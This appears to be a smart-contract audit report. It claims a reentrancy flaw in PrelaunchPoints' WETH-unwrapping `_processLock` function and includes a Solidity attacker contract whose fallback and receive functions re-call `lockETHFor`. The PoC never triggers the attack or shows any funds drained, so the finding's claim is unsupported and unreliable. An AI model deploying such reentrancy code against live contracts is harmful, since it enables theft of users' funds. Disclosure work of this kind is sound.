# Vulnerability details

## Vulnerability Details
The `_processLock` function within the PrelaunchPoints contract is susceptible to reentrancy attacks when handling WETH (Wrapped Ether). When locking WETH tokens, the contract calls the external `WETH.withdraw` function to convert them back to Ether. If an attacker's contract reenters the vulnerable contract during this process, it can manipulate the state and potentially withdraw funds multiple times

## Impact
An attacker exploiting this reentrancy vulnerability could drain funds from the contract, manipulate user balances, and disrupt the intended operation of the contract.

## Proof of Concept
To demonstrate the vulnerability, an attacker can deploy a malicious contract that repeatedly calls the `lockETH` or `lockETHFor` functions, triggering reentrancy attacks during the token withdrawal process.
```solidity
pragma solidity ^0.8.20;

contract MaliciousContract {
    PrelaunchPoints vulnerableContract;
    
    constructor(address _vulnerableContract) {
        vulnerableContract = PrelaunchPoints(_vulnerableContract);
    }
    
    // Fallback function to reenter the vulnerable contract
    fallback() external payable {
        vulnerableContract.lockETHFor(msg.sender, bytes32(0));
    }
    
    // Receive function to reenter the vulnerable contract
    receive() external payable {
        vulnerableContract.lockETHFor(msg.sender, bytes32(0));
    }
}
```
